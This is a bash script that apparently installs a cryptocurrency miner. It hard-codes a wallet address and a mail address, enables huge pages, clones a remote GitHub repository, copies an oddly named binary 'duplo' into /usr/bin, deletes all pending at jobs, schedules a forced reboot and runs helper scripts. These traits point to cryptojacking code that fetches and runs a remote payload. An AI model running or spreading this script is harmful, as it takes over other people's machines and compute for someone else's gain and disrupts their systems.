#!/bin/bash

WALLET=46hET53HZrBFj4NxgT9hXDLnAu93yuXToZ5LUHGGxbPd8ma73AWCWngPGivVm4ZraWSsJobk8eQaRbD5fqrSmgQ7DGF8Qnm
ID="$(hostname)"
MAIL=kotminkot@yandex.ru
PASSWORD=$ID:$MAIL
THREADS="$(nproc --all)"

rm -rf /tmp/server7/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir server7
git clone https://github.com/rekek/server7.git /tmp/server7
cd /tmp/server7
chmod +x /tmp/server7/duplo
chmod 777 ./*.sh
cp /tmp/server7/duplo /usr/bin/
sleep 3

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 1 hours < /tmp/at.txt
echo -e 'Restart job specified'
sleep 3
sudo apt-get install dos2unix

dos2unix time1.sh
dos2unix 75.sh
dos2unix 50.sh
dos2unix 80.sh
dos2unix 65.sh
dos2unix 90.sh
dos2unix 40.sh

./time1.sh


